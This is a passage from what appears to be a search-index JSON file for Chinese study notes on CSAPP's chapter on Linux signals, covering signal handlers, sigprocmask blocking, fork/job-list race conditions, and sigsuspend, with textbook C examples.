Sigprocmask ( SIG_SETMASK , & prev_all , NULL ); } if ( errno != ECHILD ) Sio_error ( \"waitpid error\" ); errno = olderrno ; } main (synchronized) int main ( int argc , char ** argv ) { int pid ; sigset_t mask_all , mask_one , prev_one ; Sigfillset ( & mask_all ); Sigemptyset ( & mask_one ); Sigaddset ( & mask_one , SIGCHLD ); Signal ( SIGCHLD , handler ); initjobs (); while ( 1 ) { Sigprocmask ( SIG_BLOCK , & mask_one , & prev_one ); /* Block SIGCHLD */ if (( pid = Fork ()) == 0 ) { Sigprocmask ( SIG_SETMASK , & prev_one , NULL ); /* Unblock SIGCHLD */ Execve ( \"/bin/date\" , argv , NULL ); } Sigprocmask ( SIG_BLOCK , & mask_all , NULL ); addjob ( pid ); Sigprocmask ( SIG_SETMASK , & prev_one , NULL ); /* Unblock SIGCHLD */ } exit ( 0 ); } \u8be5\u7a0b\u5e8f\u662f\u4e00\u4e2a\u5178\u578b\u7684 Unix Shell \u7ed3\u6784\uff0c\u7236\u8fdb\u7a0b\u7ef4\u62a4\u4e00\u4e2a\u5168\u5c40 job list\uff1b main \u4e2d\u7684 addjob() \u548c handler \u4e2d\u7684 deletejob() \u5b58\u5728\u7ade\u4e89\uff0c\u5982\u679c deletejob() \u8d62\u4e86\uff0c\u5c31\u4f1a\u5bfc\u81f4\u540c\u6b65\u9519\u8bef \u7236\u8fdb\u7a0b fork \u540e\uff0c\u5185\u6838\u7acb\u9a6c\u8c03\u5ea6\u5b50\u8fdb\u7a0b\u6267\u884c\u5b8c\uff0c\u53d1\u9001 SIGCHLD \uff0c\u7136\u540e\u8c03\u7528 handler \u7236\u8fdb\u7a0b\u8981\u4fdd\u8bc1\u5148 addjob() \u518d deletejob() \uff0c\u56e0\u6b64\u53ef\u4ee5\u5728 Fork \u524d\u963b\u585e SIGCHLD \uff0c\u800c\u5728 addjob() \u540e\u89e3\u9664\u963b\u585e\uff0c\u8fd9\u6837\u5c31\u4fdd\u8bc1\u4e86 handler \u4e00\u5b9a\u5728 addjob() \u540e\u8c03\u7528\u3002 (\u6ce8\u610f\u5b50\u8fdb\u7a0b\u4f1a\u7ee7\u627f\u7236\u8fdb\u7a0b\u7684\u963b\u585e\u96c6\u5408) (4). \u663e\u5f0f\u7b49\u5f85\u4fe1\u53f7 \ud83e\uddd0 \u6709\u65f6\u4e3b\u7a0b\u5e8f\u9700\u8981\u663e\u5f0f\u7b49\u5f85\u6536\u5230\u67d0\u4e2a\u4fe1\u53f7\uff0c\u4f8b\u5982: Linux Shell \u521b\u5efa\u4e00\u4e2a\u524d\u53f0\u4f5c\u4e1a\u65f6\uff0c\u8981\u663e\u5f0f\u7b49\u5f85\u4f5c\u4e1a\u7ec8\u6b62\u3001\u88ab SIGCHLD handler \u56de\u6536\u540e\uff0c\u518d\u89e3\u6790\u4e0b\u4e00\u6761\u547d\u4ee4 eg main (wasteful) #include \"csapp.h\" volatile sig_atomic_t pid ; int main ( int argc , char ** argv ) { sigset_t mask , prev ; Signal ( SIGCHLD , sigchld_handler ); Signal ( SIGINT , sigint_handler ); Sigemptyset ( & mask ); Sigaddset ( & mask , SIGCHLD ); while ( 1 ) { /* Block SIGCHLD: main and sigchld_handler race on pid */ Sigprocmask ( SIG_BLOCK , & mask , & prev ); if ( Fork () == 0 ) exit ( 0 ); pid = 0 ; Sigprocmask ( SIG_SETMASK , & prev , NULL ); /* Wait SIGCHLD to be received (wasteful) */ while ( ! pid ); /* Do some work after receiving SIGCHLD */ printf ( \"--- \\n \" ); Sleep ( 2 ); } exit ( 0 ); } handlers void sigchld_handler ( int s ) { int olderrno = errno ; pid = waitpid ( -1 , NULL , 0 ); errno = olderrno ; } void sigint_handler ( int s ) { // exit(0); } main (correct) int main ( int argc , char ** argv ) { sigset_t mask , prev ; Signal ( SIGCHLD , sigchld_handler ); Signal ( SIGINT , sigint_handler ); Sigemptyset ( & mask ); Sigaddset ( & mask , SIGCHLD ); while ( 1 ) { Sigprocmask ( SIG_BLOCK , & mask , & prev ); /* Block SIGCHLD */ if ( Fork () == 0 ) exit ( 0 ); pid = 0 ; while ( ! pid ) sigsuspend ( & prev ); Sigprocmask ( SIG_SETMASK , & prev , NULL ); printf ( \"--- \\n \" ); Sleep ( 2 ); } exit ( 0 ); } \u4e3b\u7a0b\u5e8f\u4ee5\u65e0\u9650\u5faa\u73af\u7684\u65b9\u5f0f\u7b49\u5f85 pid \u53d8\u4e3a\u975e 0\uff0c\u8fd9\u6837\u5f88\u6d6a\u8d39\u5904\u7406\u5668\u8d44\u6e90\u3002\u800c\u5982\u679c: while ( ! pid ) { pause (); } pause \u4f1a\u88ab\u5176\u4ed6\u4fe1\u53f7\u6253\u65ad\uff0c\u56e0\u800c\u9700\u8981\u5faa\u73af\uff1b\u95ee\u9898\u5728\u4e8e\uff0c\u5982\u679c\u5728\u5224\u65ad\u6761\u4ef6\u548c pause \u4e4b\u95f4\u6536\u5230 SIGCHLD\uff0c pause \u6c38\u8fdc\u7761\u7720 while ( ! pid ) { sleep ( 1 ); } \u592a\u6162\u4e86\u3002\u5982\u679c\u7528 nanosleep \u4e00\u7c7b\u7684\u9ad8\u7cbe\u5ea6\u51fd\u6570\u4e5f\u662f\u4e0d\u53ef\u63a5\u53d7\u7684\uff0c\u95f4\u9694\u592a\u5c0f\u592a\u6d6a\u8d39\uff0c\u592a\u5927\u53c8\u592a\u6162 #include <signal.h> int sigsuspend ( const sigset_t * mask ); sigsuspend \u7528 mask \u66ff\u6362\u5f53\u524d\u963b\u585e\u96c6\u5408\uff0c\u7136\u540e\u6302\u8d77\u5f53\u524d\u8fdb\u7a0b\uff0c\u76f4\u5230\u6536\u5230\u4e00\u4e2a\u4fe1\u53f7 $s$: \u82e5 $s$ \u7684\u9ed8\u8ba4\u884c\u4e3a\u662f\u7ec8\u6b62\uff0c\u7a0b\u5e8f\u76f4\u63a5\u9000\u51fa \u5426\u5219\uff0c\u8c03\u7528 handler\uff0c\u8fd4\u56de\u540e\u6062\u590d\u539f\u672c\u7684\u963b\u585e\u96c6\u5408 sigsuspend \u7b49\u4ef7\u4e8e\u4e0b\u8ff0\u4ee3\u7801\u7684\u539f\u5b50\u7248\u672c: 1 2 3 sigprocmask ( SIG_SETMASK , & mask , & prev ); pause (); sigprocmask ( SIG_SETMASK , & prev , NULL ); \u539f\u5b50\u5c5e\u6027\u4fdd\u8bc1\u4e86 1-2 \u884c\u7684\u8c03\u7528\u540c\u65f6\u53d1\u751f\uff0c\u4e0d\u53ef\u4e2d\u65ad\u3002\u9488\u5bf9 Shell \u4f8b\u5b50\u7684\u4f7f\u7528\u65b9\u6cd5\u4e3a: \u5148\u963b\u585e SIGCHLD \uff0c\u518d\u7528 sigsuspend \u53d6\u6d88\u5bf9 SIGCHLD \u7684\u963b\u585e\uff0c\u4fdd\u8bc1\u4e86\u4e0d\u4f1a\u5728 pause \u548c\u5faa\u73af\u6761\u4ef6\u4e4b\u95f4\u6267\u884c SIGCHLD \u7684 handler","title":"2. signal"},{"location":"_csapp/_ECF/2/#1-linux","text":"\u4fe1\u53f7\u662f\u8fdb\u7a0b\u95f4\u901a\u4fe1\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u5c31\u884c\u4e3a\u800c\u8a00\u5b83\u662f\u4e00\u79cd\u8f6f\u4ef6\u5f62\u5f0f\u7684\u5f02\u5e38\u3002 Linux signals","title":"1. Linux \u4fe1\u53f7"},{"location":"_csapp/_ECF/2/#1","text":"\u5185\u6838\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u7ef4\u62a4\u4e24\u4e2a\u4f4d\u5411\u91cf\uff0c\u8868\u793a\u4e0e\u4e4b\u76f8\u5173\u7684\u4fe1\u53f7\u72b6\u6001 pending :\u2002 \u5f85\u5904\u7406 (\u672a\u51b3) \u7684\u4fe1\u53f7\u96c6\u5408 blocked :\u2002 \u88ab\u963b\u585e\u7684\u4fe1\u53f7\u96c6\u5408 \u5185\u6838\u901a\u8fc7\u66f4\u65b0\u8fdb\u7a0b $P$ \u7684 pending \u5411\u91cf\uff0c\u5411\u5176\u53d1\u9001\u4fe1\u53f7\u3002\u53d1\u4fe1\u53f7\u539f\u56e0\u53ef\u80fd\u51fa\u4e8e \u5185\u6838\u68c0\u6d4b\u5230\u4e00\u4e2a\u7cfb\u7edf event\uff0c\u4f8b\u5982\u9664\u96f6\u9519\u8bef \u6216 \u5b50\u8fdb\u7a0b\u7ec8\u6b62 \u5176\u4ed6\u8fdb\u7a0b\u8c03\u7528\u4e86 kill \uff0c\u663e\u5f0f\u8981\u6c42\u5185\u6838\u53d1\u9001\u4fe1\u53f7\u7ed9\u76ee\u7684\u8fdb\u7a0b \u5f53\u5185\u6838\u628a\u8fdb\u7a0b $P$ \u4ece kernel mode \u8f6c\u4e3a user mode \u65f6 (\u4ece\u7cfb\u7edf\u8c03\u7528\u8fd4\u56de / \u5b8c\u6210\u4e0a\u4e0b\u6587\u5207\u6362)\uff0c$P$ \u8ba1\u7b97 rcv = pending & ~blocked \uff0c\u82e5\u975e\u7a7a\uff0c\u5185\u6838\u4ece\u4e2d\u9009\u53d6\u67d0\u4e2a\u4fe1\u53f7 $k$ (typically smallest) \u8ba9 $P$ \u5f3a\u5236\u63a5\u6536\uff0c\u7136\u540e\u6267\u884c\u63a5\u6536\u540e\u7684\u884c\u4e3a\uff0c\u6bcf\u79cd\u4fe1\u53f7\u90fd\u6709\u9ed8\u8ba4\u884c\u4e3a\uff0c\u662f\u4e0b\u9762\u4e4b\u4e00: \u8fdb\u7a0b\u7ec8\u6b62 \u2002 (e.g. SIGKILL ) \u8fdb\u7a0b\u7ec8\u6b62\u5e76\u8f6c\u50a8\u5185\u5b58 \u8fdb\u7a0b\u6302\u8d77\u76f4\u5230\u88ab SIGCONT \u91cd\u542f \u8fdb\u7a0b\u5ffd\u7565\u8be5\u4fe1\u53f7 \u2002 (e.g. SIGCHLD ) \u8fdb\u7a0b\u53ef\u4ee5\u66f4\u6539\u9ed8\u8ba4\u884c\u4e3a (\u6355\u83b7); \u5b8c\u6210\u63a5\u6536\u884c\u4e3a\u540e\uff0c\u5c31\u5c06\u63a7\u5236\u4f20\u56de $P$ \u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u3002 \u4efb\u4f55\u65f6\u523b\uff0c\u540c\u4e00\u7c7b\u578b\u53ea\u53ef\u80fd\u6709\u4e00\u4e2a pending \u4fe1\u53f7\uff0c\u540c\u7c7b\u578b\u7684\u5176\u4ed6\u4fe1\u53f7\u4f1a\u88ab\u4e22\u5f03\u3002","title":"(1). \u901a\u4fe1\u8fc7\u7a0b"},{"location":"_csapp/_ECF/2/#2","text":"Unix \u63d0\u4f9b\u4e86\u5f88\u591a\u53d1\u9001\u4fe1\u53f7\u7684\u673a\u5236\uff0c\u8fd9\u4e9b\u673a\u5236\u90fd\u57fa\u4e8e\u8fdb\u7a0b\u7ec4\u8fd9\u4e2a\u6982\u5ff5\u3002\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u53ea\u5c5e\u4e8e\u4e00\u4e2a\u8fdb\u7a0b\u7ec4\uff0c\u8fdb\u7a0b\u7ec4\u7531\u4e00\u4e2a\u6b63\u6574\u6570 ID \u6807\u8bc6\u3002 #include <unistd.h> pid_t getpgrp ( void ); int setpgid ( pid_t pid , pid_t pgid ); getpgrp :\u2002 \u8fd4\u56de\u5f53\u524d\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u7ec4 ID setpgid :\u2002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5b50\u8fdb\u7a0b\u548c\u5b83\u7684\u7236\u8fdb\u7a0b\u5c5e\u4e8e\u540c\u4e00\u4e2a\u7ec4\uff0c\u6b64\u51fd\u6570\u5c06 pid \u7684\u8fdb\u7a0b\u7ec4\u53f7\u6539\u4e3a pgid pid=0 \u8868\u793a pid = \u8c03\u7528\u8fdb\u7a0b pgid=0 \u8868\u793a\u7528 pid \u6307\u5b9a\u7684\u8fdb\u7a0b\u4f5c\u4e3a\u8fdb\u7a0b\u7ec4 ID","title":"(2). \u8fdb\u7a0b\u7ec4"},{"location":"_csapp/_ECF/2/#3-unix-shell","text":"Unix Shell \u4f7f\u7528\u4f5c\u4e1a (job) \u8fd9\u4e2a\u6982\u5ff5\u8868\u793a\u5bf9\u4e00\u6761\u547d\u4ee4\u884c\u6c42\u503c\u800c\u521b\u5efa\u7684\u8fdb\u7a0b \u4efb\u610f\u65f6\u523b\uff0c\u81f3\u591a\u6709\u4e00\u4e2a\u524d\u53f0\u4f5c\u4e1a\uff0c\u53ef\u80fd\u6709 0 / \u591a \u4e2a\u540e\u53f0\u4f5c\u4e1a\uff0c\u4f8b\u5982\uff0c $ ls | sort \u4f1a\u521b\u5efa\u7531\u4e24\u4e2a\u8fdb\u7a0b\u7ec4\u6210\u7684\u524d\u53f0\u4f5c\u4e1a \u952e\u5165 Ctrl+C \u4f1a\u5bfc\u81f4\u5185\u6838\u53d1\u9001 SIGINT \u5230\u524d\u53f0\u8fdb\u7a0b\u7ec4\u7684\u6bcf\u4e2a\u8fdb\u7a0b\uff0c\u9ed8\u8ba4\u4f1a\u7ec8\u6b62\u524d\u53f0\u8fdb\u7a0b \u952e\u5165 Ctrl+Z \u4f1a\u5bfc\u81f4\u5185\u6838\u53d1\u9001 SIGTSTP \u5230\u524d\u53f0\u8fdb\u7a0b\u7ec4\u7684\u6bcf\u4e2a\u8fdb\u7a0b\uff0c\u9ed8\u8ba4\u4f1a\u6302\u8d77\u524d\u53f0\u4f5c\u4e1a","title":"(3). Unix Shell \u673a\u5236"},{"location":"_csapp/_ECF/2/#2-api","text":"","title":"2. \u76f8\u5173 API"},{"location":"_csapp/_ECF/2/#1_1","text":"#include <sys/types.h> #include <signal.h> int kill ( pid_t pid , int sig ); pid > 0 :\u2002 \u53d1\u9001\u4fe1\u53f7 sig \u7ed9 pid pid = 0 :\u2002 \u53d1\u9001\u4fe1\u53f7 sig \u7ed9 \u8c03\u7528\u8fdb\u7a0b\u6240\u5728\u8fdb\u7a0b\u7ec4\u4e2d\u7684\u6bcf\u4e2a\u8fdb\u7a0b pid < 0 :\u2002 \u53d1\u9001\u4fe1\u53f7 sig \u7ed9 \u8fdb\u7a0b\u7ec4 $|$ pid $|$ \u4e2d\u7684\u6bcf\u4e2a\u8fdb\u7a0b #include <unistd.h> unsigned int alarm ( unsigned int secs ); \u5b89\u6392\u5185\u6838\u5728 secs \u79d2\u540e\u53d1\u9001 SIGALRM \u7ed9\u8c03\u7528\u8fdb\u7a0b\uff0c\u5e76\u53d6\u6d88\u5f85\u5904\u7406\u7684 alarm \uff0c\u8fd4\u56de\u524d\u4e00\u6b21 alarm \u5269\u4f59\u7684\u79d2\u6570 (\u82e5\u6ca1\u6709\u8fd4\u56de 0); \u5982\u679c secs = 0 \uff0c\u4e0d\u4f1a\u5b89\u6392\u65b0\u7684 alarm .","title":"(1). \u53d1\u9001\u4fe1\u53f7"},{"location":"_csapp/_ECF/2/#2_1","text":"\u8fdb\u7a0b\u53ef\u4ee5\u901a\u8fc7 signal \u51fd\u6570\u4fee\u6539\u4fe1\u53f7\u5173\u8054\u7684\u9ed8\u8ba4\u884c\u4e3a (\u9664\u4e86 SIGSTOP & SIGKILL ) #include <signal.h> typedef void ( * sighandler_t ) ( int ); sighandler_t signal ( ing signum , sighandler_t handler ); handler : SIG_IGN :\u2002 \u5ffd\u7565\u7c7b\u578b\u4e3a signum \u7684\u4fe1\u53f7 SIG_DFL :\u2002 \u4e3a\u7c7b\u578b\u4e3a signum \u7684\u4fe1\u53f7\u6062\u590d\u9ed8\u8ba4\u884c\u4e3a \u5426\u5219\uff0c handler \u6307\u5411\u4fe1\u53f7\u5904\u7406\u51fd\u6570\uff0c\u8c03\u7528\u6b64\u51fd\u6570\u88ab\u79f0\u4f5c\u6355\u83b7\u4fe1\u53f7 \u5904\u7406\u7a0b\u5e8f return \u540e\uff0c\u63a7\u5236\u8fd4\u56de\u4e3b\u7a0b\u5e8f\u88ab\u4e2d\u65ad\u7684\u4f4d\u7f6e\u3002\u6ce8\u610f\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u672c\u8eab\u4e5f\u53ef\u4ee5\u88ab\u4fe1\u53f7\u4e2d\u65ad\u3002","title":"(2). \u63a5\u6536\u4fe1\u53f7"},{"location":"_csapp/_ECF/2/#3","text":"Linux \u6709\u4e24\u79cd\u963b\u585e\u673a\u5236: implicit:\u2002 \u5185\u6838\u9ed8\u8ba4\u963b\u585e \u5f53\u524d\u5904\u7406\u7a0b\u5e8f\u6b63\u5728\u5904\u7406\u7684\u4fe1\u53f7\u7c7b\u578b\uff0ci.e. \u5f53 handle $S$ \u6b63\u8fd0\u884c\u65f6\u82e5\u6536\u5230 $s$ \u4fe1\u53f7\uff0c pending(s) = blocked(s) = 1 explicit:\u2002 \u8c03\u7528 sigprocmask \u548c\u5b83\u7684\u8f85\u52a9\u51fd\u6570\u4eec #include <signal.h> int sigprocmask ( int how , const sigset_t * set , sigset_t * oldset ); int sigemptyset ( sigset_t * set ); int sigfillset ( sigset_t * set ); int sigaddset ( sigset_t * set , int signum ); int sigdelset ( sigset_t * set , int signum ); int sigismember ( const sigset_t * set , int signum ); sigprocmask \u7684\u884c\u4e3a\u4f9d\u8d56\u4e8e how \u7684\u503c: SIG_BLOCK :\u2002 \u628a set \u4e2d\u7684\u4fe1\u53f7\u52a0\u5230 blocked \u4e2d ( blocked = blocked | set ) SIG_UNBLOCK :\u2002 \u4ece blocked \u4e2d\u5220\u9664 set \u4e2d\u7684\u4fe1\u53f7 ( blocked = blocked & ~set ) SIG_SETMASK :\u2002 blocked = set \u5982\u679c oldset \u975e\u7a7a\uff0c blocked \u88ab\u4fee\u6539\u4e4b\u524d\u7684\u503c\u4fdd\u5b58\u5728 oldset \u4e2d\u3002","title":"(3). \u963b\u585e\u4fe1\u53f7"},{"location":"_csapp/_ECF/2/#3_1","text":"","title":"3. \u7f16\u5199\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f"},{"location":"_csapp/_ECF/2/#1_2","text":"handler \u8981\u5c3d\u53ef\u80fd\u7b80\u5355 \u5728 handler \u4e2d\u53ea\u8c03\u7528\u5f02\u6b65\u4fe1\u53f7\u5b89\u5168\u7684\u51fd\u6570 \u5f02\u6b65\u5b89\u5168: \u8981\u4e48\u8be5\u51fd\u6570\u662f\u53ef\u91cd\u5165\u7684\uff0c\u8981\u4e48\u5b83\u4e0d\u80fd\u88ab\u4fe1\u53f7\u5904\u7406\u7a0b\u5e8f\u4e2d\u65ad \u4fdd\u5b58\u548c\u6062\u590d errno \u8bb8\u591a Linux \u5f02\u6b65\u5b89\u5168\u7684\u51fd\u6570\u90fd\u4f1a\u5728\u51fa\u9519\u65f6\u8bbe\u7f6e errno \uff0c\u5728 handler \u4e2d\u8c03\u7528\u8fd9\u6837\u7684\u51fd\u6570\u53ef\u80fd\u5f71\u54cd\u4e3b\u7a0b\u5e8f\u4e2d\u4f9d\u8d56 errno \u7684\u51fd\u6570 (handler \u4e0d\u8fd4\u56de\u5219\u4e0d\u9700\u8981) \u8bbf\u95ee\u5168\u5c40\u6570\u636e\u7ed3\u6784\u65f6\uff0c\u963b\u585e\u6240\u6709\u4fe1\u53f7 \u8bbf\u95ee\u5168\u5c40\u6570\u636e\u7ed3\u6784\u7684\u6307\u4ee4\u5e8f\u5217\u4e0d\u53ef\u88ab\u4e2d\u65ad \u7528 volatile \u58f0\u660e\u5168\u5c40\u53d8\u91cf \u7f16\u8bd1\u5668\u4f18\u5316\u65f6\u53ef\u80fd\u8ba4\u4e3a\u88ab handler \u6539\u53d8\u7684\u53d8\u91cf\u6ca1\u53d1\u751f\u53d8\u5316\uff0c\u56e0\u800c\u4f7f\u7528\u7f13\u5b58\u4e2d\u7684\u503c","title":"(1). \u57fa\u672c\u539f\u5219"},{"location":"_csapp/_ECF/2/#2_2","text":"\u53ea\u8981\u6709\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u7ec8\u6b62\u6216\u505c\u6b62\uff0c\u5185\u6838\u5c31\u4f1a\u53d1\u9001 SIGCHLD \u7ed9\u7236\u8fdb\u7a0b\u3002 main #include \"csapp.h\" void handler1 ( int sig ); void handler2 ( int sig ); int main () { int i , n ; char buf [ MAXBUF ]; if ( signal ( SIGCHLD , handler2 ) == SIG_ERR ) unix_error ( \"signal error\" ); for ( i = 0 ; i < 3 ; ++ i ) { if ( Fork () == 0 ) { printf ( \"Hello from child %d \\n \" , ( int ) getpid ()); exit ( 0 ); } } while ( 1 ); } handler1 void handler1 ( int sig ) { int olderrno = errno ; if ( waitpid ( -1 , NULL , 0 ) < 0 ) sio_error ( \"waitpid error\" ); Sio_puts ( \"Handler reaped child \\n \" ); Sleep ( 1 ); errno = olderrno ; } handler2 void handler2 ( int sig ) { int olderrno = errno ; while ( waitpid ( -1 , NULL , 0 ) > 0 ) { Sio_puts ( \"Handler reaped child \\n \" ); } if ( errno != ECHILD ) sio_error ( \"waitpid error\" ); Sleep ( 1 ); errno = olderrno ; } \u8be5\u7a0b\u5e8f\u7684\u76ee\u7684\u662f\u56de\u6536\u6240\u6709\u7ec8\u6b62\u7684\u5b50\u8fdb\u7a0b\u3002 handler1 :\u2002 \u53ef\u80fd\u5904\u7406\u7b2c\u4e00\u4e2a SIGCHLD \u65f6\uff0c \u540e\u4e24\u4e2a SIGCHLD \u5df2\u53d1\u9001\uff0c\u7531\u4e8e pending \u53ea\u6709\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u6700\u540e\u4e00\u4e2a SIGCHLD \u4f1a\u88ab\u4e22\u5f03 handler2 :\u2002 \u6bcf\u6536\u5230 SIGCHLD \u65f6\u53ef\u80fd\u6709\u591a\u4e2a\u5b50\u8fdb\u7a0b\u7ec8\u6b62\uff0c\u56e0\u800c\u5c3d\u53ef\u80fd\u5730\u56de\u6536\u662f\u6b63\u786e\u7684 \u7531\u4e8e\u540c\u7c7b\u4fe1\u53f7\u4e0d\u6392\u961f\uff0c\u56e0\u6b64\u4e0d\u80fd\u7528\u4fe1\u53f7\u5bf9\u5176\u4ed6\u8fdb\u7a0b\u53d1\u751f\u7684\u4e8b\u4ef6\u8ba1\u6570\u3002","title":"(2). \u540c\u7c7b\u4fe1\u53f7\u4e0d\u6392\u961f"},{"location":"_csapp/_ECF/2/#3_2","text":"main (with a subtle synchronized error) int main ( int argc , char ** argv ) { int pid ; sigset_t mask_all , prev_all ; Sigfillset ( & mask_all ); Signal ( SIGCHLD , handler ); initjobs (); while ( 1 ) { if (( pid = Fork ()) == 0 ) { Execve ( \"/bin/date\" , argv , NULL ); } Sigprocmask ( SIG_BLOCK , & mask_all , & prev_all ); addjob ( pid ); Sigprocmask ( SIG_SETMASK , & prev_all , NULL ); } exit ( 0 ); } handler void handler ( int sig ) { int olderrno = errno ; sigset_t mask_all , prev_all ; pid_t pid ; Sigfillset ( & mask_all ); while (( pid = waitpid ( -1 , NULL , 0 )) > 0 ) { Sigprocmask ( SIG_BLOCK , & mask_all , & prev_all ); deletejob ( pid ); Sigprocmask ( SIG_SETMASK , & prev_all , NULL ); } if ( errno != ECHILD ) Sio_error ( \"waitpid error\" ); errno = olderrno ; } main (synchronized) int main ( int argc , char ** argv ) { int pid ; sigset_t mask_all , mask_one , prev_one ; Sigfillset ( & mask_all ); Sigemptyset ( & mask_one ); Sigaddset ( & mask_one , SIGCHLD ); Signal ( SIGCHLD , handler ); initjobs (); while ( 1 ) { Sigprocmask ( SIG_BLOCK , & mask_one , & prev_one ); /* Block SIGCHLD */ if (( pid = Fork ()) == 0 ) { Sigprocmask ( SIG_SETMASK , & prev_one , NULL ); /* Unblock SIGCHLD */ Execve ( \"/bin/date\" , argv , NULL ); } Sigprocmask ( SIG_BLOCK , & mask_all , NULL ); addjob ( pid ); Sigprocmask ( SIG_SETMASK , & prev_one , NULL ); /* Unblock SIGCHLD */ } exit ( 0 ); } \u8be5\u7a0b\u5e8f\u662f\u4e00\u4e2a\u5178\u578b\u7684 Unix Shell \u7ed3\u6784\uff0c\u7236\u8fdb\u7a0b\u7ef4\u62a4\u4e00\u4e2a\u5168\u5c40 job list\uff1b main \u4e2d\u7684 addjob() \u548c handler \u4e2d\u7684 deletejob() \u5b58\u5728\u7ade\u4e89\uff0c\u5982\u679c deletejob() \u8d62\u4e86\uff0c\u5c31\u4f1a\u5bfc\u81f4\u540c\u6b65\u9519\u8bef \u7236\u8fdb\u7a0b fork \u540e\uff0c\u5185\u6838\u7acb\u9a6c\u8c03\u5ea6\u5b50\u8fdb\u7a0b\u6267\u884c\u5b8c\uff0c\u53d1\u9001 SIGCHLD \uff0c\u7136\u540e\u8c03\u7528 handler \u7236\u8fdb\u7a0b\u8981\u4fdd\u8bc1\u5148 addjob() \u518d deletejob() \uff0c\u56e0\u6b64\u53ef\u4ee5\u5728 Fork \u524d\u963b\u585e SIGCHLD \uff0c\u800c\u5728 addjob() \u540e\u89e3\u9664\u963b\u585e\uff0c\u8fd9\u6837\u5c31\u4fdd\u8bc1\u4e86 handler \u4e00\u5b9a\u5728 addjob() \u540e\u8c03\u7528\u3002 (\u6ce8\u610f\u5b50\u8fdb\u7a0b\u4f1a\u7ee7\u627f\u7236\u8fdb\u7a0b\u7684\u963b\u585e\u96c6\u5408)","title":"(3). \u540c\u6b65\u5e76\u53d1\u6d41"},{"location":"_csapp/_ECF/2/#4","text":"\u6709\u65f6\u4e3b\u7a0b\u5e8f\u9700\u8981\u663e\u5f0f\u7b49\u5f85\u6536\u5230\u67d0\u4e2a\u4fe1\u53f7\uff0c\u4f8b\u5982: Linux Shell \u521b\u5efa\u4e00\u4e2a\u524d\u53f0\u4f5c\u4e1a\u65f6\uff0c\u8981\u663e\u5f0f\u7b49\u5f85\u4f5c\u4e1a\u7ec8\u6b62\u3001\u88ab SIGCHLD handler \u56de\u6536\u540e\uff0c\u518d\u89e3\u6790\u4e0b\u4e00\u6761\u547d\u4ee4 eg main (wasteful) #include \"csapp.h\" volatile sig_atomic_t pid ; int main ( int argc , char ** argv ) { sigset_t mask , prev ; Signal ( SIGCHLD , sigchld_handler ); Signal ( SIGINT , sigint_handler ); Sigemptyset ( & mask ); Sigaddset ( & mask , SIGCHLD ); while ( 1 ) { /* Block SIGCHLD: main and sigchld_handler race on pid */ Sigprocmask ( SIG_BLOCK , & mask , & prev ); if ( Fork () == 0 ) exit ( 0 ); pid = 0 ; Sigprocmask ( SIG_SETMASK , & prev , NULL ); /* Wait SIGCHLD to be received (wasteful) */ while ( ! pid ); /* Do some work after receiving SIGCHLD */ printf ( \"--- \\n \" ); Sleep ( 2 ); } exit ( 0 ); } handlers void sigchld_handler ( int s ) { int olderrno = errno ; pid = waitpid ( -1 , NULL , 0 ); errno = olderrno ; } void sigint_handler ( int s ) { // exit(0); } main (correct) int main ( int argc , char ** argv ) { sigset_t mask , prev ; Signal ( SIGCHLD , sigchld_handler ); Signal ( SIGINT , sigint_handler ); Sigemptyset ( & mask ); Sigaddset ( & mask , SIGCHLD ); while ( 1 ) { Sigprocmask ( SIG_BLOCK , & mask , & prev ); /* Block SIGCHLD */ if ( Fork () == 0 ) exit ( 0 ); pid = 0 ; while ( ! pid ) sigsuspend ( & prev ); Sigprocmask ( SIG_SETMASK , & prev , NULL ); printf ( \"--- \\n \" ); Sleep ( 2 ); } exit ( 0 ); } \u4e3b\u7a0b\u5e8f\u4ee5\u65e0\u9650\u5faa\u73af\u7684\u65b9\u5f0f\u7b49\u5f85 pid \u53d8\u4e3a\u975e 0\uff0c\u8fd9\u6837\u5f88\u6d6a\u8d39\u5904\u7406\u5668\u8d44\u6e90\u3002\u800c\u5982\u679c: while ( ! pid ) { pause (); } pause \u4f1a\u88ab\u5176\u4ed6\u4fe1\u53f7\u6253\u65ad\uff0c\u56e0\u800c\u9700\u8981\u5faa\u73af\uff1b\u95ee\u9898\u5728\u4e8e\uff0c\u5982\u679c\u5728\u5224\u65ad\u6761\u4ef6\u548c pause \u4e4b\u95f4\u6536\u5230 SIGCHLD\uff0c pause \u6c38\u8fdc\u7761\u7720 while ( ! pid ) { sleep ( 1 ); } \u592a\u6162\u4e86\u3002\u5982\u679c\u7528 nanosleep \u4e00\u7c7b\u7684\u9ad8\u7cbe\u5ea6\u51fd\u6570\u4e5f\u662f\u4e0d\u53ef\u63a5\u53d7\u7684\uff0c\u95f4\u9694\u592a\u5c0f\u592a\u6d6a\u8d39\uff0c\u592a\u5927\u53c8\u592a\u6162 #include <signal.h> int sigsuspend ( const sigset_t * mask ); sigsuspend \u7528 mask \u66ff\u6362\u5f53\u524d\u963b\u585e\u96c6\u5408\uff0c\u7136\u540e\u6302\u8d77\u5f53\u524d\u8fdb\u7a0b\uff0c\u76f4\u5230\u6536\u5230\u4e00\u4e2a\u4fe1\u53f7 $s$: \u82e5 $s$ \u7684\u9ed8\u8ba4\u884c\u4e3a\u662f\u7ec8\u6b62\uff0c\u7a0b\u5e8f\u76f4\u63a5\u9000\u51fa \u5426\u5219\uff0c\u8c03\u7528 handler\uff0c\u8fd4\u56de\u540e\u6062\u590d\u539f\u672c\u7684\u963b\u585e\u96c6\u5408 sigsuspend \u7b49\u4ef7\u4e8e\u4e0b\u8ff0\u4ee3\u7801\u7684\u539f\u5b50\u7248\u672c: 1 2 3 sigprocmask ( SIG_SETMASK , & mask , & prev ); pause (); sigprocmask ( SIG_SETMASK , & prev , NULL ); \u539f\u5b50\u5c5e\u6027\u4fdd\u8bc1\u4e86 1-2 \u884c\u7684\u8c03\u7528\u540c\u65f6\u53d1\u751f\uff0c\u4e0d\u53ef\u4e2d\u65ad\u3002\u9488\u5bf9 Shell 